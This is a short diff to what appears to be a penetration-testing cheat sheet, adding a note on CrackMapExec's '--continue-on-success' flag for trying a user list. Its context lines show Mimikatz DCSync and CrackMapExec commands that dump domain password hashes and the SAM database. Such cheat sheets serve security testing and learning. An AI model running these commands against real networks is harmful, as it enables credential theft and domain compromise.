@@ -113,6 +113,8 @@ Or use Mimikatz to extract hashes from NTDS.dit
 mimikatz # lsadump::dcsync /domain:domain.local /all /csv          
 
 ## Crackmapexec     
+--continue-on-success    #flag to continue to continue through a userlist even after a successful logon    
+
 Dump SAM using adminc creds   
 
     crackmapexec smb 10.10.10.10 -u UserNAme -p 'PASSWORDH' --sam   #dump SAM - needs admin creds      
